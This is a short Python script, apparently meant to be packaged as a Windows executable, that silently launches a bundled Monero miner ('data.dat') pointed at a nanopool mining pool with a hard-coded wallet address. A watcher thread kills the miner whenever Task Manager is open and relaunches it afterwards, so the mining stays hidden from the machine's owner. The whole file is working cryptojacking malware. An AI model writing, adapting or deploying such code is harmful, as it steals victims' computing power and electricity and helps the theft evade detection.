import os
import subprocess
import psutil
import time
import threading    
import sys

def enject():
    with open("chcekdata", "w") as f:
        f.write("True")

def dosya_yolu(dosya_adı):
    """Dosyanın .exe içinde veya normal çalışmada doğru konumunu döndürür."""
    if getattr(sys, 'frozen', False):  # Eğer exe olarak çalışıyorsa
        return os.path.join(sys._MEIPASS, dosya_adı)
    else:  # Python dosyası olarak çalışıyorsa
        return os.path.join(os.path.dirname(__file__), dosya_adı)
data = dosya_yolu("data.dat")
def start():

    subprocess.Popen(f"cmd.exe /c start /B {data} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def kill():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
            process.terminate()  # Programı sonlandır
            process.wait()  # Sonlanmasını bekle
            print("data.dat başarıyla durduruldu.")
            return True
    print("data.dat bulunamadı.")
    return False


def ifapp():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            return True
    return False


def is_task_manager_open():
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() == "taskmgr.exe":
            return True
    return False


def task_manager_watcher():
    while True:
        if is_task_manager_open():
            print("Görev Yöneticisi Açıldı!")
            kill()
        elif not ifapp():
            subprocess.Popen(f"cmd.exe /c start /B {data} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)


task = threading.Thread(target=task_manager_watcher)
task.start()

start()


